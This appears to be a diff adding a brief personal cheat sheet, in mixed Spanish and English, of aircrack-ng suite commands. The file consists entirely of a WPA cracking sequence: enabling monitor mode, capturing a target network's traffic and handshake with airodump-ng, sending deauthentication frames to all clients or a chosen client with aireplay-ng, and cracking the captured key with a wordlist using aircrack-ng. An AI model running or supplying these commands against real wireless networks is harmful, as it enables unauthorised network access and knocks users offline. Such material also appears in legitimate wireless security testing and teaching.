@@ -1,0 +1,21 @@
+
+airmon-ng start wifi0 9 //Opcional si se utilizan los comandos para el kismet
+
+------------------------
+
+airodump-ng wlan0 //capture networrks info 
+
+airodump-ng -c6 --bssid [MAC-addres] --write WPAPRueba  wlan0 //capture networks info specifiying the chanel and de BSSID, (ademas recoje el hansake en un fichero)
+---------------------------------------------
+
+aireplay-ng --deauth 100 -a [MAC-addres] wlan0 //deautenticate in mode in broadcast
+
+aireplay-ng -0 1 -a [MAC-addres] -c [MAC-addres]  wlan0 //deauthenticate a concret client
+----------------------------------------------
+
+aircrack-ng -w password.lst -b [MAC-addres] psk*.cap //desencripted de key 
+
+
+
+airodump-ng wlan0 -w wlan_0 --output-format csv # Record and write results tocsv format
+
